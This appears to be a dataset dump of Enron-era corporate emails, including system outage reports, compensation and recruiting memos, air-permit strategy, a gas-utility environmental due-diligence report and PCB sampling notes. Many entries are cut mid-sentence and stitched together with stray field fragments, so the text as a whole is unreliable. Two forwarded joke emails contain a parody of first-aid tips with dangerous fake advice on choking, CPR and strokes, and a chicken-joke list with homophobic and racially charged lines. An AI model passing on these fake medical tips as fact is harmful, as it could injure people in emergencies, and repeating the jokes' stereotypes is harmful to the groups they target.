fixed with a software patch from Sybase Monday evening. All affected deals 
were then uploaded. Nominations were completed for these deals on Monday 
through manual estimation by the schedulers. 
Communication between the DBA group and the application group was delayed on 
the Global Systems replication problem. This delayed our ability to notify 
users of the problem. Communication on problems will be be improved in the 
future. The default assumption will be to notify key application and 
infrastructure personnel as soon as any serious problem is identified. 

2.  We experienced a hardware issue with a bad server CPU at 3:00AM on 
Thursday.  As a result, database backups ran into the morning when the server 
came back up. This created slow system response and delayed logins for users 
until 10:00 AM. This problem is now fixed. 
 Action Item: Kishore will coordinate with Randy Matson from the 
infrastructure group to coordinate a stress test of all production server 
components. This will allow us to see if we can find any other marginal 
components.  This will be completed by September 18. 

3. All service PMAs for ENA and HPLC were not picked up by the Settlements 
process. HPLC PMAs were run manually by the users. For ENA, missing PMAs were 
immaterial and the users decided to close with these results. We have now 
found and fixed the error that caused this problem. 
 Action Item: Chris Schomer is having his team investigate this problem to 
see if this is just a Sybase 12.0 issue or whether this error could have 
impacted previous months. A determination should be available by September 
15. 

4. Enpower deal load did not load deals with referenced prices correctly. 
These deals have now been successfully loaded and are currently completed 
through the mass draft process for power. We have identified and fixed the 
software error that caused this problem. 

5. Power mass draft is now running very slow as compared to prior months. We 
are currently working to complete the Power mass draft process. It will be 
completed by the user deadline for close of business Wednesday Sept. 6. 
 Action Item: Chris Schomer's team is investigating why the Power mass draft 
is running so slow.  At present we do not have a definitive answer. We hope 
to develop a definitive answer and action plan by September 15. Our current 
hypothesis for why we have this problem includes : 
Data changes - we now have a much higher volume of hourly priced deals
Potential database index issues. We will re-build all power database indexes 
and re-compile the stored procedures
Sybase optimizer flakiness. We often see Sybase suddenly start to have 
processing problems for no apparent reason.  


Update On Future Tactical  And Strategic Improvements

We have several pending tactical Unify performance improvements that are in 
process. These include: 

1) Isolating Unify Gas on a server of it's own 
2) Delivery of a middle tier mass draft process to reduce locking and blocking
3) Upgrade of the middle tier mass draft process to allow for drafting at a 
deal level (rather than just a counter-party level)
4) Delivery of the nominations and balancing process on a middle tier 
architecture.

Ramesh Rao and his team have the strategic projects progressing on schedule.  
We are seeing significant performance gains in our testing of SQL Server over 
Sybase. We also have identified a couple of hardware vendors that could 
provide very large, scaleable computing environments for this type of Unify 
architecture. We plan to have all critical evaluation testing completed by 
the end of September as planned. We will present our recommendations along 
with a high-level strategic delivery plan by early October.

287,"I have asked ENA's Compensation team within HR to conduct a compensation 
study for me for all positions from Manager level through Vice President.  
This analysis will include employees who are dedicated to ENA, EIM and EGM.

It had been the plan to complete our compensation analysis by focusing on the 
Manager level and above, following the market analysis for Senior Specialists 
and below that was completed by Yvonne Land.  I learned recently that Yvonne 
has left the Company and that she had not begun the analysis for Managers and 
above.

Todd Burke, who recently joined Enron, will be conducting the market survey 
and compensation analysis.  I met with Todd recently.  He has had wonderful 
experience with Towers Perin and Watson Wyatt, and I feel that we are 
fortunate to have him devoted to this project.  Please give sufficient 
thought and attention to requests from Todd.  The quality and timeliness of 
your responses will directly impact the quality and timeliness of the 
analysis that I will receive from Todd.  I think that you should each have a 
vested interest in the success of this project!

Todd also plans to resurvey market information for Senior Specialists and 
below so that his view of compensation will be complete and timely for all of 
Energy Operations.  Since we recently took action on compensation levels for 
key players at the Senior Specialist level and below, I would not anticipate 
further adjustments for those levels as a result of Todd's review.

You should receive a message from Todd in the next day or so in which he will 
detail steps in the compensation analysis and what your role will be.

313,"In an October 3 update meeting with Rick Buy and Rick Causey on Doorstep reviews, both were very supportive of the efforts to date this year.  Since we were in the midst of the budgeting process, we wanted their view on the continuation of Doorstep Reviews, and they resoundingly agreed that the effort is valuable to Enron and that they wanted to be certain that the effort continues.  

In reviewing the plans for 4th quarter, one of our issues was the willingness of key staff members to travel long distances in light of the September 11th terrorists attacks.  We were in agreement on postponing some of the planned 4th quarter reviews until early 2002.  Planned reviews for the Metals business and certain other EEL lines of business were reaffirmed by Buy and Causey for completion in the 4th quarter.   

Certainly life on October 26 feels different today at Enron than it did on October 3.  I understand multiple demands on staff members currently and the additional demands of the budgeting process, and in your case, the voluntary redundancy program.  In the next few days I will again review the 4th quarter plans for Doorstep reviews with Buy and Causey, sharing with them your concerns.  I will let you know the outcome of those conversations.  If there is still a strong desire to complete these reviews this year, we will work creatively to leverage work that is being done through the EAS process and minimize both travel and time involved.  -Sally

330,"While recruiting on campus recently I became aware that a decision was made 
at the Program level to not interview this fall for 2001 summer interns.  In 
talking with students and faculty at The University of Texas and University 
of Oklahoma, it became clear that there is concern over the feasibility of an 
internship with Enron, as other top firms will be recruiting this fall for 
summer 2001 interns.  I have communicated my concerns to Lexi Elliott and her 
manager, Shelley Jones, and was told by both that the decision to delay 
interviews for summer interns was made at a Program level based on Enron's 
staffing.  When I asked about the competitive data available regarding the 
practice of other firms on summer intern interviews, I was even more 
concerned to discover that neither Lexi nor Shelley had that data.  It would 
seem critical to know what the competition is doing in terms of summer intern 
interview schedules in order to understand the risk that could be created for 
Enron by not interviewing this fall for these important feeder positions for 
our Analyst and Associates programs.  

I have had conversations over the last two weeks with Lexi and Shelley, with 
no resolution.  When they could not provide the competitive data to either 
confirm or eliminate my concerns, I volunteered to have James Scribner, a  
Senior Director on my team, obtain this market information.  Lexi and Shelley 
either did not have the time to gather this data, or were not sure how to do 
so.  They were pleased to have some help in getting our hands on this 
critical information.  I now have information at hand with regard to firms 
that will be recruiting at UT and OU this fall for summer intern positions.   
And based on this information, I believe that Enron is at risk for not hiring 
top students as interns for the summer of 2001 if we do not interview for 
these positions this fall.  

While my research only touches on two of the schools at which Enron recruits, 
I want to raise concern over this as a potential problem at many, if not all 
campuses that we have targeted for recruiting.    As administrators of the 
program, you rely on the involvement of senior members of the company to 
carry the Enron message to campus.  I believe that we also have an obligation 
to make this a two-way messaging system.  I strongly believe that we must 
address this potential risk for Enron extremely quickly, as teams will be on 
campuses across the country to conduct interviews in a matter of days.  I 
suspect that many Enron participants in the recruiting process are unaware of 
the Program's decision regarding the timing of interviews for summer 
internships.  In working with Rick Causey and Mike McConnell, executive 
sponsors for UT and OU, respectively, they are as concerned as I about the 
decision on interviewing summer interns.  I have copied both of them on this 
note to the two of you. 

Please let me know how this can be resolved.  With the help of James Scribner 
and others, we have already compiled a list of students at UT and OU that 
should be targeted for summer internships.  I will offer as much of my time 
as is feasible to work with staff members of the Program to devise creative 
ways to turn this around.  ","Lexi Elliott Shelley Jones Lexi Shelley James Scribner Shelley

IMPORTANCE OF THE GMAT:
     The GMAT score is a critical part of your application to business
school.  Indeed, in many cases, it is the single most decisive statistic
that admissions offices use in evaluating applicants.  While work
experience, GPA, essays, and interviews are all important components of
your application, the GMAT is the one objective factor that you can
substantially improve in a short period of time.

THE TEXAS MBA TOUR:
     All interested Enron employees are invited to attend the Texas MBA
Tour, which will be in Houston on Wednesday, January 23. The Texas MBA
Tour, of which The Princeton Review is a partner, is a group of six business
schools that host a joint MBA panel discussion and admissions fair.  The
participating schools are Texas, Rice, SMU, Baylor, TCU, and Texas A&M.
The Princeton Review has agreed to handle registration for the event, so
call
(800) 2REVIEW to register.

Most recently, Ken had been assisting in the transition of Enron Broadband Services to Wholesale Services.  Kevin recently left Broadband Services to lead our Global Assets business.

In addition to building a wholesale model for the trading of bandwidth as a commodity, Ken and Kevin made significant contributions to the development of our wholesale business.  I am grateful to both of them for their outstanding service to Enron.

I am pleased to announce that effective immediately Stan Horton, chairman and CEO of Enron Transportation Services, will assume additional leadership responsibility as chairman and CEO of Enron Global Assets, excluding the South American merchant business, which will continue to report to John Lavorato.  Stan is a 28-year veteran of the company with a proven track record of outstanding results.  Enron Global Assets will continue to function as a separate unit headed by President and Chief Operating Officer Jim Hughes, who will report to Stan.

Can you prepare a brief presentation that would serve as a discussion document for such a meeting. The concept is that a deal flows into a website?? that is basically a checklist and the transaction is sized and scoped. If it met deal criteria and portfolio requirements, it would flow directly to an outside shop that would fund, bill, track etc. Enron could possibly keep a small interest in economics and of course a skim.

362,"First Aid Tips
In a medical emergency, knowing what to do can make all the difference.
Here are some tips to help you handle an unexpected injury or illness:
* In the event of decapitation, sit the victim's body in a chair
as best you can, balance the head on top of the shoulders, and walk away
whistling nonchalantly.
* Always keep plenty of gauze around the house in case you invent
an invisibility potion.
* If you did all you could and the victim still dies, pat him or
her down for a Snickers bar. It's not like you don't deserve one.
* Nothing revives a stroke victim like an eye-popping orgasm.
* If someone you know is seriously injured, cradle his or her head
in your lap and scream, ""Why?""
* Administering CPR is easy. Just do it like you saw them do on TV
that one time.
* In the event of accidental drug overdose, call Lou Reed
immediately.
* To stop a nosebleed, apply pressure. To start a nosebleed, apply
even greater pressure in short, repeated bursts.
* If a person requires artificial respiration, and you are of the
same sex as the person, and no one of the opposite sex is around to
perform the procedure, you are gay.
* If the Heimlich maneuver is ineffective on a choking victim,
grab his or her neck and squeeze downward to force the food into the
stomach. If this fails, grab the victim's ankles and swing him or her
around in a circle to force the food up.
* Make sure your first-aid kid contains a large, frilly Victorian
fan to revive fainting victims.
* If you are a hideous, disfigured hunchback and you see someone
who is injured and unconscious, treat the person. Then, as the person
begins to wake up, retreat into hiding. The person will always wonder
who saved him or her, and the experience will be poignant in a
bittersweet way.
* As a rule of thumb, always ask yourself this question: What
would Randolph Mantooth do?
* If possible, try to be the guy who tells the victim,
""Everything's going to be all right,"" while others do the actual work.

I fight for the chickens and I am fighting for the chickens right now. I
will not give up on the chickens crossing the road!  I will fight for the
chickens and I will not disappoint them.

GOVERNOR GEORGE W. BUSH
I don't believe we need to get the chickens across the road.  I say give
the road to the chickens and let them decide.  The government needs to let
go of strangling the chickens so they can get across
the road.

SENATOR LIEBERMAN
I believe that every chicken has the right to worship their God In their
own way.  Crossing the road is a spiritual journey and no chicken should be
denied the right to cross the road in their own
way.

SECRETARY CHENEY
Chickens are big-time because they have wings. They could fly if they
wanted to.  Chickens don't want to cross the road.  They don't need help
crossing the road.  In fact, I'm not interested in crossing the road
myself.

RALPH NADER
Chickens are misled into believing there is a road by the evil
tiremakers. Chickens aren't ignorant, but our society pays tiremakers to
create the need for these roads and then lures chickens into believing
there is an advantage to crossing them.  Down with the roads, up with
chickens.

PAT BUCHANAN
To steal a job from a decent, hardworking American.

JERRY FALWELL
Because the chicken was gay!  Isn't it obvious? Can't you people See the
plain truth in front of your face?  The chicken was going to the ""other
side."" That's what ""they"" call it-the ""other side."" Yes, my friends, that
chicken is gay.  And, if you eat that chicken, you
will become gay too.  I say we boycott all chickens until we sort out
this abomination that the liberal media whitewashes with seemingly harmless
phrases like ""the other side."" That chicken should not be free to cross the
road.  It's as plain and simple as that.

DR.  SEUSS
Did the chicken cross the road?  Did he cross it with a toad?  Yes!  The
chicken crossed the road, but why it crossed, I've not been told!

ERNEST HEMINGWAY
To die.  In the rain.

MARTIN LUTHER KING, JR.
I envision a world where all chickens will be free to cross without having
their motives called into question.

GRANDPA
In my day, we didn't ask why the chicken crossed the road.  Someone told us
that the chicken crossed the road,and that was good enough for us.

ARISTOTLE
It is the nature of chickens to cross the road.

KARL MARX
It was a historical inevitability.

SADDAM HUSSEIN
This was an unprovoked act of rebellion and we were quite justified in
dropping 50 tons of nerve gas on it.

RONALD REAGAN
What chicken?

CAPTAIN JAMES T.  KIRK
To boldly go where no chicken has gone before.

FOX MULDER
You saw it cross the road with your own eyes. How many more chickens
have to cross before you believe it?

FREUD
The fact that you are at all concerned that the chicken crossed the road
reveals your underlying sexual insecurity.

BILL GATES
I have just released eChicken 2000, which will not only cross roads, but
will lay eggs, file your important documents, and balance your checkbook
-and Internet Explorer is an inextricable part of eChicken.

EINSTEIN
Did the chicken really cross the road or did the road move beneath the
chicken?

BILL CLINTON
I did not cross the road with THAT chicken.  What do you mean by
""chicken""? Could you define ""chicken"" please?

GEORGE BUSH
I don't think I should have to answer that question.

LOUIS FARRAKHAN
The road, you will see, represents the black man. The chicken crossed
the ""black man"" in order to trample him and keep him down.

370,"As an update to many of you, I have been on the phone with Roger Kohn of EPA
Region 9 a couple of different times today.  It turns out that what they
really were expecting to see was something more like a formal Biological
Assessment (BA) for CS 3 and CS 4, not a biological survey report like we
provided.  According to the Endangered Species Act (ESA), the lead Federal
agency in a Federal Action is responsible for preparing the BA, but a BA is
typically only required when the action ""may affect"" a listed species, which
is not the case here.  EPA Region 9, and based on our experience across the
country, apparently only Region 9, is interpreting their responsibilities
under the ESA very strictly and somewhat ""oddly.""  Regardless, the bottom
line is that it appears we could argue with them ad nauseum and still end up
right back here.  So, we have begun working very quickly and diligently to
put together a ""BA-like"" document that, according to Roger, will give them
what they need to put in their files to cover themselves for satisfying the
ESA.

I told him that the USFWS typically (under ""normal"" circumstances) receives
a BA from the lead federal agency and then issues their Biological Opinion
(BO).  I asked him if they (EPA) were going to still feel like they needed
any kind of concurrence from the USFWS.  He said that only if we were going
to have any findings of ""may affect"" would they maybe feel the need to get
additional concurrence from the USFWS.  I told him that you (Larry) already
have a verbal concurrence from USFWS that there are no issues, in addition
to the fact that our surveys confirmed that.  I told him that our ""BA-like""
document is going to come to the same conclusions that our Survey Report did
(i.e., No Effect).  He said that he understands, and will likely just
receive the document, assure himself that it says what it needs to say, and
is formatted in the manner he feels it needs to be formatted, put it in his
files, and put out the Public Notice for a 30-day comment period.  If this
all happens by early next week, we should still have permits by the
beginning of November. I will continue to hammer home the importance of that
schedule.  Some of us will be on a conference call with Roger and one of the
EPA attorneys tomorrow to try to ""get inside their heads"" a little bit
better regarding why they are the only Region interpreting their ESA
responsibilities so strictly.  We will debrief you after the call.  Scott

371,"Great, Jerry. I take it then that simultaneous operation of the new and old 
is a physical impossibility. Can we take this to the next step then, to 
carefully walk through the netting calculations (Shudeish & Prabhat are doing 
this) to minimize the total emissions that can occur (""potential to emit"") at 
any one time. The way I read the existing permits, however, is that allowable 
(and unenforceable bec of grandfathering?) emissions are NOx is 1428 tpy and 
CO is 429 tpy at each station, which may mean that we can not characterize 
these as ""minor"" sources. If the netting calculation is such that we can 
avoid New Source Review (I believe this to be the case bec there is planned 
to be a new reduction), we can do the 401.01(5) construction activities and 
try to get a fast-track permit approval.
I still do not whether, as a technical matter, the applications could qualify 
as ""minor"" revisions under R18-2-319.A, which mean,
1. Do not violate any applicable requirement
2. Do not involve substantive changes to existing monitoring, reporting, or 
record-keeping requirements in the permit
3. Do not require or change a case-by-case determination of an emission 
limitation or other standard, or a source-specific determination of ambient 
impacts, or a visibility or increment analysis
4. Do not seek to establish or change a permit condition for which there is 
no corresponding underlying applicable requirement and that the source has 
assumed in order to avoid an applicable requirement to which the source would 
otherwise be subject. The terms and conditions include:
     a. A federally enforceable emissions cap that the source would assume to 
avoid classification as a modification under any provision of Title I of the 
Clean Air Act; and
     b. An alternative emisssions limit approved under regulations 
promulgated under CAA sec 112(i)(5)
5. Are not modifications under and provision of Title I of the CAA
6. Are not changes in fuels not represented in the permit application or 
provided for in the permit
7. The increase in the source's potential to emit is not significant (40 tpy 
NOx, etc) [not applicable to TWP bec net reduction]
8. Are not required to processed as a significant revision under R18-2-320 
(refers to signif change in existing monitoring terms or relaxation of 
reporting/recordkeeping or ""does not qualify as a minor permit revision...."")
If someone could make a hard analysis of the foregoing, that might provide us 
additional strength.

1.  EPA did not include the stain tube request for sulfur monitoring.  The 
methods that are currently listed are wet chemistry methods.  As we 
discussed, since the permit allows us to use an APPROVED, alternate method, 
we will need to submit this request at some time.  For the time being, since 
we want to receive this permit ASAP we should be able to accept the permit as 
is.

First issue, that we did not anticipate from the ADEQ.  It applies to hours=

Second issue.  The EPA has given us a pretty good permit for stations 3 and=

or ton/yr.  The values that they have given us in the permit are OK (25 ppm=

the emissions estimates for the auxillary engines at sta. 1-4.  Understand 
these are not actual emissions, but are emissions based upon potential to 
emit.  When these units were permitted actual testing data was not required, 
so each unit was permitted based upon an accpeted emissions limit from an EPA 
approved document.  This has worked out in our favor as the emisisons numbers 
presented in the EPA document were high, therefore, this will allow us to net 
more emissions, if needed.  Emissions are presented for a single engine only 
in tons per year, even though there are two auxillary units at each facility 
except Sta. 1 where they only have one auxillary unit.

383,"As per your request, an environmental due diligence was completed of the 
assets and outstanding issues of Northwest Natural Gas Company (NWNG), a 
local distribution company  (LDC), with its corporate headquarters located in 
Portand, Oregon.  This  due diligence, which was conducted on August 7-9, 
2001,  was performed to determine the environmental liabilities and exposures 
which may be associated with  NWNG and identify and evaluate the 
environmental risks associated with each issue.  A relative risk number 
between 0 and 3 has been assigned to each discipline to evulate the potential 
risk impact.  A rating of ""0"" indicates that there is no risk associated with 
this regulation or issue and a rating of ""3"" indicates a major problem or an 
issue that has a potential long term risk or exposure.  An approximate cost  
value has also been assigned to each discipline.   It is to be understood and 
explicitly stated that in the calculation of each cost, conservative 
estimates were used to determine a dollar value to repair, remediate or 
formally close each issue. 

Presented below, by discipline, are the environmental activities which impact 
and affect NWNG.  The evualtion and written discussion of each disicpline is 
based upon the availability of records, documents and discussions with NWNG 
personnel.  Therefore, this summary report is limited to the availability of 
information presented.

General Pipeline Characteristics ;

This is a dry pipeline system.  No pipeline liquids are generated, only small 
volumes of compressor oils are collected.
All cast iron pipe has been removed from the system.  There is still approx. 
100 miles of steel pipe which will be repalced in the near future.  
The only location where horsepower and compression exists is at Mist Storage, 
and underground injection and storage reservoir (10.5 bcf storage capacity). 
this is a non Title V major source.
NWNG is planning additional property acquisitions to increase their 
underground storage capacity. 
NWNG is planning a 60 mile pipeline construction project to begin in fall of 
2002.  All environmental studies have been completed and sumbmitted to the 
agencies.
Landslide hazards appear to be the biggest pipeline safety concern.  NWNG has 
completed a study to locate and identify high potential landslide areas.    

Environmental Procedures Manual.   The NWNG environmental procedures manual  
appeared to be comprehensive and in a easily understood format.  The topics 
covered in the manual addressed all environmenatl issues that the company 
appeared to be involved with.  The manual addressed waste management, 
permitting,  disposal and environmetal stewardship.  There was also a written 
statement from management supporting and attesting to NWNG's commitment to 
enhancing and promoting a clean environment in all activities by NWNG. 
Risk: 0  Cost: $0

Notices of Violation (NOV)/Notices of Noncompliance (NON).   In a summary 
page provided by NWNG, a list of all state and federal agency actions against 
the company was available.  Although the company had received a few  notices 
(<10), they were of a very minor nature and involved mostly small 
recordkeeping and right of way issues.  There were no outstanding judgements, 
NOVs, NONs or pending agency actions or  issues to be resoved.  
Risk: 0  Cost: $0 

PCBs.  In interviews with NWNG, they attested to the fact that they have 
never used PCBs on their pipeline and that PCBs have never been detected.  
Although NWNG is an LDC and receives its gas from Northwest Pipeline Company, 
the status of PCBs on the Northwest pipeline system  was unknown.
Risk:  1  Cost: $0        

Mercury.   Mercury was used on the NWNG system, but only in monometers and 
not in natural gas metering equipment.  A decision was made by environmental 
management of NWNG in 1986-87 to remove mercury manometers.  An investigation 
has never been initiated to determine mercury releases from broken manometers 
or potential mercury releases from old historic mercury containing equipment 
which may have been used. 
Risk:  1  Cost:  $3,000-$40,000

Onsite Disposal.  Other than the issues surrounding the manufactured gas 
plants, in interviews with NWNG's environmental management, they were not 
aware of any onsite waste disposal of any hazardous, toxic or non hazardous 
waste.
Risk:   1  Cost:   undefined

Hazardous Waste.  There is only one location where hazardous waste is 
generated and this location is a service center where a small parts washer is 
used.  This site is classified as a conditionally exempt small quantity 
generator.  The remainder of the NWNG system is a non generator of hazardous 
waste.
Risk: 0  Cost:  0 

NORMS.  The environmental management of NWNG has stated that natrually 
occurring radioactive materials (NORMS) are not a problem in the pipeline 
system.  Tesing has not been completed to verify or confirm this, nor does 
NWNG have evidence to determine NORM status from Northwest  Pipeline Company.
Risk:  1  Cost:  $500

Underground Storage Tanks (UST).  There is only one regulated underground 
storage tank (UST) remaining on the NWNG system (Albany), and this tank is in 
complance with the UST regualtions for monitoring, testing and 
recordkeeping.  All other underground tanks have been removed.  At one of the 
tank removal sites, there exists  an active remediation in progress.  Closure 
of this site is expected in the near future.
Risk: 1  Cost: $500

LNG plants.  In interviews with NWNG environmental management, there are no 
histoirc or present outstanding environmental issues at the liquified natural 
gas (LNG)  plants.  The exception to this is a historic site of a 
manufactured gas plant (Linnton site) which underlies the LNG plant.  This 
issue will be addressed under the section of the Linnton Manufactured Gas 
Plant. 
Risk: 0  Cost:  $0

Manufactured Gas Plants.  NWNG owned and operated  a number of manufactured 
gas plants (MGPs).  Presented below are the MGP sites that NWNG owned or had 
operating interest in for which there are associated liabilites and risks.

 Eugene Water and Electrical Board. The City of Eugene has determined that  a 
parcel of property within the city has been contaminated by   numerous 
responsible parties of which NWNG owned and operated a MGP during the time 
period of 1958-1976.  The Eugene Water and Electrical Board  (EWEB), which is 
the regulatory agency in Eugene,  has determined that the total cost to clean 
the entire area will be approximately $1,300,000, of which  the EWEB has 
indicated that NWNGs responsibility will be $93,750.  NWNG has offered to pay 
compensation damages in the amount of $70,000-90,000 to  be relaesed from all 
liability and damages associated with the contamination impacts to the City 
of Eugene.   The environmental management of NWNG  has stated that the EWEB 
has verbally and in principal agreed with the NWNG  offer of approximately 
$94,000.
 Risk: 1-2 Cost:  $94,000

 Salem Site. According to NWNG management, this historic MGP site has been 
remediated and formally closed by the City of Salem, which is the   
regulatory agency with jurisdiction over this site.  NWNG has received 
endemnification and written closure from the City of Salem for this feature.  
 Risk: 1   Cost: $0

 Manufactured Gas Plant. This site, which ceased operation in the early 
1900's, was dismantled and  abandoned.  From the time the facility ceased  
operations, untill the present, a railroad has constructed a steel rail 
bridge over the site and the City of Portland and constructed a city park.  
The site is  immediately adjacent ot he Wilammette River, a major perennial 
watercourse in Oregon.  There have been no soil, groundwater or river/ river 
sediment   studies  completed  to determine potential environmental impacts.  
NWNG environmental personnel have stated that the site was insured by Lloyds 
of  London.  The insurance policies were not available at the time of this 
due diligence to determine policy applicability and coverage amounts for this 
site.
 Risks: 2-3 Costs: 0-$300,000,000

Portland Harbor Superfund Site.  The Environmetnal Protection Agency has 
determined that the Portland Harbor, on the Wilammette River,  has received 
contamination of a sufficient nature and magnitude to warrent and classify 
the 6.7 miles of the Harbor as a Superfund site.  This superfund site extends 
for a distance of 6.7 miles and includes the Linnton and Wacker sites, 
originally owned by NWNG.  The EPA has designated approximately 69 primary 
responsible parties  which are directly or indirectly involved in the 
contamination of this section of the Willamette River.  NWNG has been 
identified as a contributing member to the contamination.

 Linnton MGP/Wacker Site.   The Linnton MGP and Wacker Site, has 47 acres of 
water front exposure on the Wilammette River and is included in the  Portland 
Harbor Superfund Site.  The Linnton facility, which originally included the 
Wacker Site,  initiated operation in 1913 and ceased operation in 1956.   
During the operation of the  facility operation,  various organic coal tar 
wastes, comprised of light non aqueous phase liquids (LNAPLs) and dense non  
aqueous phase liquids (DNAPLs) were generated.  Characteristically these 
waste products include: polynuclear aromatic hydrocarbons (PAHs), BTEX  and 
cyanide.  During the early stages of facility operation, these wastes  were 
originally directly deposited into the Willammette River, and then later, in  
1941 unlined ponds were constructed at the facility.  Preliminary 
investigation reports of the volumes of regulated waste from the facility 
operations which  were released either directly or indirectly into the soil 
underlying the facility or into the Wilamette  River were in excess of 4.6 
million gallons or 23,000 cubic  yards.   It was also estimated from these 
reports that there is approximately 250,000 cubic yards of tar and tar mixed 
with soil underlying the historic tar  ponds.  

 Negotiations for cleanup and closure of this site may take up to 20 or more 
years.  NWNG has stated that it has insurance policies from Lloyds of 
London   which they feel will cover all costs assciated with NWNG's portion 
of this superfund responsibility.  The policies were not availble during the 
due diligence  to verify or confirm the amount of coverage.  Additionally, 
because the horizontal and vertical extent of the contamination in the 
subsurface soil,   groundwater and in the Willamette River sediments has not 
been determined, it seems unlikely that insurance coverage can adequatley be 
evaluated.   It  should also be mentioned that because the proportionate 
extent of NWNGs contamination responsibility is not known, adequate insurance 
coverage  appears to be somewhat premature.

387,"With respect to the September 13, 1999 letter from Richard and Oreane Garcia 
concerning pipeline integrity  and noise issues, Transwestern Pipeline 
Company offers the following response:

Pipeline Integrity.  With the construction of the evaporation ponds over 
Transwestern's right of way and pipline, Transwestern has closely monitored 
the potential for  impacts for the pipeline.  This includes a more frequent 
inspection of the pipeline conditions underlying the ponds by taking 
potentiometric readings to verify that  corrosion is not present.  
Transwestern has also installed rectifiers to assist in eleminating the 
potential of pipeline corrosion.  As a DOT requirement, Transwestern has 
cathodically protected the entire pipeline system with an external pipeline 
coating to further ensure the integrity of the pipeline underlying the 
evaporation ponds.   The pipline safety  measures implemented by Transwestern 
are designed to not only identify corrosion iimpacts to the pipeline system 
at   the inception of detrimental impacts as a result of corrosion, but also 
allow for long term stability and integrity  by conducting state of the art 
monitoring and detection. 

Noise Issue.  In the initial environmental assessment and study, Transwestern 
conducted baseline surveys of the area to determine existing noise levels.  
This study was completed to assist Transwestern in the mitigation measures 
which will be implemented after construction of the Gallup Compresso 
Station.  Pending completion of the facility, Transwestern will conduct post 
noise studys to determine whether facility noise levels have increased above 
those levels mandated by FERC.  In the event of operational noise levels 
exceeding the FERC regulatory level of 55 ldn, Transwestern is committed to

Decrepancy of trailer park residents.  In the letter by Mr. Garcia, it was 
stated that Transwestern's assessment of the number of residences in the 
adjacent trailer park  was not 18 as had been stated in our original study, 
but ""more like 35 trailers"".  The number of mobile home residences currrently 
in the trailer park may in fact be closer to 35.  Transwestern's trailer park 
residence count was taken in the winter of the year when the fluctuating job 
market is normally down and the number of residences in the park was low.  
The transient nature of mobile home residences and the fluctuating job 
economy of the area is probably a direct reflection of the up and down nature 
of the residences.  It should also be noted that during the time that the 
trailer park count was made, the owner of the trailer park who is also the 
operator of the evaporation ponds was experiencing major difficulties in the 
operation of the  ponds and raw sewage  had overflowed the pond embankments 
and  had resulted in the raw sewage ponding in the yards of many of the 
trailer park residents.  It was actually noted that many of the spaces 
normally occupied by mobile homes had been vacated.  This unsanitary 
condition was also identified by the New Mexico Environment Department.  The 
NMED had implemented enforcement actions against the trailer park owner.     ","Richard Oreane Garcia

388,"Midland Team, the Martin Co. No. 1 facility is potentially in non compliance 
because there is new emissions data from the EPA which shows the units at 
this facility  emit emissions which would trigger a Title V air permit.  
Steve San Miguel and Stoney tried to conduct an emissions test  with a 
portable analyzer but were unable to collect representative emissions data 
due to the fact that the unit was in very poor mechanical shape and showed 
very high emissions.  We have a couple of options.  Spend the $$$$ necessary 
to bring the unit up to standards that allow a representative emissions test 
to be conducted and determine whether the emissions from the units trigger 
permit action or use the new EPA data and submit an air permit application.  
The choice is yours.  Understand, this permit if issued, places some 
recordkeeping and mechanical responsibilities on the Midland team.  Let me 
know what you would like to do.

the pueblo of Laguna to Transwestern's environmental activities at the 
facility.  The Laguna's have hired an environmental person to oversee 
environmental issues on pueblo lands.  The meeting centered around three 
issues:  a UST site which had been removed, but not formally closed, a 
historic removal of asbestos which had been buried at the facility in the 
late 1980's, and the ongoing groundwater remediation at  the site.  

Transwestern provided a history of the above mentioned activiites and why 
these issues were unresolved in the ""eyes"" of the Laguna.  Transwestern 
committed to submitting closure requests for the UST and asbestos issues.  
With repsect to the groundwater issue, a presentation was given enlighting 
the Laguna representative of the difficult nature of the subsurface geology 
and groundwater characteristics to rapidly clean the contaminants 
(chlorinated solvents and PCB's) and Transwestern's intent to continue its 
remediation efforts. Transwestern assured the Laguna environmental 
representative that all correspondance and data pertaining to environmental 
issues would be submitted to the pueblo agency.   At the conclusion of the 
meeting, the Laguna's understood Transwestern's commitment to maintaining the 
policies and practices consistent with the pueblo of Laguna.

The meeting provided Transwestern and the Laguna's with the opportunity to 
meet and share ideas and opinions and initiate working relationships.  The 
Laguna's now have an understanding of the environmental activities at the

on the SoCal system, for which Transwesten is 86% responsible, Ralph Komai, 
SoCal's PCB person provded some addtional information with respect to what is 
going on with the PCB activities on the SoCal system.  As a result of the 
PG&E press release, SoCal management directed additional sampling to be done 
at their interconnect with Transwestern and downstream of this interconnect.  
Ralph reported that a number of liquid samples came back at around 7 ppm, 
however one sample at their Kelso Station, near Barstow,  came back at 77 
ppm. 

Ralph had indicated that there has been an increase in the PCB's coming into 
their collection locations in the Needles area as evidenced by the following:

 Based upon 1997 data, almost no liquids greater than 50 ppm were revcovered

 Data collected in 1998 showed that approx. 8% of the liquids were greater 
than 50 ppm

 Data collected in 1999 showed that approx. 9% of the liquids were greater 
than 50 ppm

Based upon this, Ralph had stated that SoCal would be collecting additional 
sampling information and possibly entering into an internal montoring 
program, somewhat like PG&E is currently doing now.

I had informed Ralph that our Needles M/S facility had seen almost no liquids 
in the last 5 years, other than a recent accumulation of a one time pigging 
in early 2000 when a small volume of liquids (less than 55 gallons) had been 
collected.   We discussed that the accumulations seen on the SoCal system 
were probably from existing liquids on their system which had collected in 
low points in their pipeline and were moving downstream due to the increased 
flows from TW into SoCal.  

Ralph gave the impression that there were no immediate management tensions 
resulting from the recent ""hits"".  He just indicated that they would be 
watching their system and sampling at a more frequent basis.",Ralph Komai Ralph PCB,,"SoCal PCB PG&E revcovered

mechanical activities at C/S 2  Flagstaff and a mandatory 7 day wating period 
for agency review and approval.   Due to the urgency of the C/S 2 work being

which was included with the letter.  On Monday, the engineer called and said 
that he had read the letter and had no problems with the activity proceeding 
at the C/S.  After we had discussed this issue at some length, I posed the 
question to him of whether it was necessary to notify the agency of 
mechanical and maintenace activities which  will not impact or change a 
combustion units throughput, fuel use, emissions, horsepower, or cause a 
change in design.  After some discussions I informed him that Transwestern 
will probably inundate the agency with notification letters, he stated that 
as long as the engines operating parameters would not change, ( horsepower, 
emissions, throughput, fuel use etc), and the burden of responsibility will 
rest on Transwestern to ensure that no permit conditions are violated, he 
stated that we may proceed with these types of activities in Arizona without 
any notification to the agency.   

The only hitch being, that when Transwestern does a major mechanical 
activity, which would cost more than  25-30% of the cost of replacing a unit, 
that we provide them a courtesy notification.  I told them we would apprise 
them of such an activity.....

Please give me a report following your fly-over of the route with Doug 
Cebryk.  I am very interested in what you see and the potentials that are 
there.  Don't forget to take your camera.  Pictures (slides) would be most 
helpful as we work through the early planning stages for the greenfield 
